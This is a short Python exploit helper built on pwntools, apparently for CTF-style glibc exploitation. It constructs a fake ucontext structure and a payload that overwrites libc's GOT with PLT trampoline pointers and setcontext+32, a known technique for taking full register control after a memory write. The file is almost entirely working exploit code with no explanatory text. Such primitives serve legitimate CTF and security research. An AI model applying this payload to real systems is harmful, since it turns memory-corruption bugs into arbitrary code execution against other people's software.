from collections import defaultdict
import struct

from pwn import ELF, flat


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def create_ucontext(readable_address: int, regs: dict[str, int]) -> bytearray:
    regs = defaultdict(int, regs)

    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(readable_address)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0x28:0x30] = p64(regs["r8"])
    b[0x30:0x38] = p64(regs["r9"])

    b[0x48:0x50] = p64(regs["r12"])
    b[0x50:0x58] = p64(regs["r13"])
    b[0x58:0x60] = p64(regs["r14"])
    b[0x60:0x68] = p64(regs["r15"])
    b[0x68:0x70] = p64(regs["rdi"])
    b[0x70:0x78] = p64(regs["rsi"])
    b[0x78:0x80] = p64(regs["rbp"])
    b[0x80:0x88] = p64(regs["rbx"])
    b[0x98:0xA0] = p64(regs["rcx"])
    b[0x88:0x90] = p64(regs["rdx"])

    b[0xA0:0xA8] = p64(regs["rsp"])
    b[0xA8:0xB0] = p64(regs["rip"])

    return b


def setcontext32(libc: ELF, regs: dict[str, int] = {}) -> tuple[int, bytes]:
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    ucontext = create_ucontext(
        libc.address, {"rsp": libc.symbols["environ"] + 8} | regs
    )

    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        ucontext,
    )
